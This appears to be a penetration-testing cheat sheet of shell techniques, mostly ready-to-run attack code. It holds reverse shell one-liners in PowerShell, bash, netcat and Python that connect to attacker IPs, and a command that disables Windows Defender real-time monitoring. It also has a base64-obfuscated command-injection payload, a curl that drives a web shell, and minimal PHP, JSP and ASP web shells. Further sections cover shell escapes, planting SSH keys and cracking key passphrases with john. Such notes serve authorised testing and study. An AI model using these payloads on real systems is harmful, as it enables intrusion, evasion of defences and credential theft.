## delete


# Shell
## LISTENING SHELL
- `nc -lnvp 9999`

# [Reverse Shell](https://www.revshells.com/)
With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.

If we can execute commands on the target, we can try to create MSFVenom payload and execute it inside target

## Windows
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.60',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

### Disable AV
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

## sh files
```bash
#!\bin/bash 

sh -i >& /dev/tcp/10.10.14.5/9999 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 9999 >/tmp/fs
```

### Execute Reverse Shell File
```bash
# Transfir File to Target
$ curl <MY_IP>:<MY_PORT>/bash.sh -o /tmp/bash.sh
$ wget <MY_IP>:<MY_PORT>/bash.sh 

# Execute Shell
$ ./tmp/bash.sh
$ bash /tmp/bash.sh
```

## Pyton
```py
$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## Upload PHP file that works like a page
`https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php` 

## Payloads CI
```bash
# Convert reverse shell to base64
$ echo 'sh -i >& /dev/tcp/10.10.14.8/9999 0>&1' | base64

# Send the payload
$ echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC85OTk5IDA+JjEK"|base64${IFS}-d|bash

# Execute reverse shell
$ bash -c("sh -i >& /dev/tcp/10.10.14.5/4444 0>&1")
$ curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.60/443 0>&1"'`
$ bash -c 'sh -i >%26 /dev/tcp/10.10.14.5/9999 0>%261'`
```

* * *

# Bind Shells
With a bind shell, the target system has a listener started and awaits a connection from a pentester's system.


```bash
bash
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

# Connect Attack
$ nc -nv 10.129.41.200 7777
```

* * *

# [Web Shells](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
`copy from /usr/share/laudanum`

## [PHP](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) 
```bash
<?php SYSTEM($_REQUEST['cmd']); ?>
```

- [phpbash](https://github.com/Arrexel/phpbash)


## [ASPX Antak Webshell](https://github.com/samratashok/nishang/tree/master/Antak-WebShell)
`copy from /usr/share/nishang/Antak-WebShell`

> Antak is a web shell built-in ASP.Net. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server.

## JSP
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## ASP
```
<% eval request("cmd") %>
```

## [War](https://github.com/BustedSec/webshell/blob/master/webshell.war)
> java/war (Tomcat, Axis2, or WebLogic)

```bash
$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
$ zip -r backup.war cmd.jsp 
```

# Interactive Shells
```bash
# Python
python3 -c 'import pty;pty.spawn("/bin/bash")'
"CTRL+Z"
stty raw -echo; fg
export TERM=xterm

# /bin/sh -i
/bin/sh -i

# Perl
perl —e 'exec "/bin/sh";'

## The command should be run from a script.
perl: exec "/bin/sh";


# Ruby
## The command should be run from a script.
ruby: exec "/bin/sh"


# Lua
## The command should be run from a script.
lua: os.execute('/bin/sh')


# AWK
awk 'BEGIN {system("/bin/sh")}'


# Find
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;


# Using Exec To Launch A Shell
find . -exec /bin/sh \; -quit

# VIM
vim -c ':!/bin/sh'


# Vim Escape
vim
:set shell=/bin/sh
:shell
```

## Generate SSH Key
### Victim
```bash
$ ssh-keygen
$ cd ./ssh
$ cat id_rsa.pub > authorized_keys
$ chmod 700 ~/
$ chmod 700 ~/.ssh
$ chmod 600 ~/.ssh/authorized_key
```

### Host
```bash
$ nano id_rsa
(Copy from id_rsa victim)
$ chmod 400 id_rsa
$ ssh -i id_rsa matt@10.10.11.136
```

### PassPhrase 
```bash
$ python3 /usr/share/john/ssh2john.py id_rsa > hash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
$ john --show hash.txt
```

